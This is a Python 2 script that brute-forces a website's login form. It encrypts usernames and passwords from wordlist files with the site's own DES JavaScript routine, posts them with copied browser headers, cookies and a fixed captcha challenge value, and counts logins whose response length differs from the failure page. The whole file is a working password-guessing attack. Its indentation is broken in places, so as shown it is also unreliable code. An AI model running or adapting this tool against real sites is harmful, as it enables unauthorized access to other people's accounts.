#coding:utf-8
#from selenium import webdriver
import execjs
import requests
import re




successCount = 0


def mzDes(s,para):
    despara = execjs.get().compile(s).call("strEnc",para,"csc","mz","2017")
    return despara

with open('des.js','r') as mzCrypto:
        
        s = mzCrypto.read()
        with open('users.txt','r') as users:   #des username
        
                
        user = users.readlines()
        for u in user:
            with open('top50.txt','r') as pwds:   #des password
                    uname = u.strip()
                    print uname
                    desUsername = mzDes(s,uname)
                    print desUsername
            
                    pwd = pwds.readlines()
                    for p in pwd:
                        passwd = p.strip()
                        print passwd
                        desPassword = mzDes(s,passwd)
                        print desPassword


            

                        burp0_url = "https://yyy.xxx.com:443/login"
                        burp0_cookies = {"acw_tc": "2", "session.id": "5e"}
                        burp0_headers = {"User-Agent": "Mozilla/5.0 Firefox", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://yyy.xxx.com", "Connection": "close", "Referer": "https://yyy.xxx.com/login", "Upgrade-Insecure-Requests": "1"}
                        burp0_data = {"usernumber": "test", "username": desUsername, "password": desPassword, "geetest_challenge": "caaf52fec"}
                
                        rsp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
                
                        #print rsp.headers['content-length']
                        #if rsp.headers['content-length'] != 23862:
                        #   print 'success!!!'
                        print len(rsp.content)
                        if len(rsp.content) != 23862:
                        print 'success'
                        successCount = successCount + 1
                        pattern = re.compile(r'<p class="login-error" id="errorTips">(.*?)</p>')

                        bruteResult = pattern.search(rsp.text)
                        print bruteResult

print successCount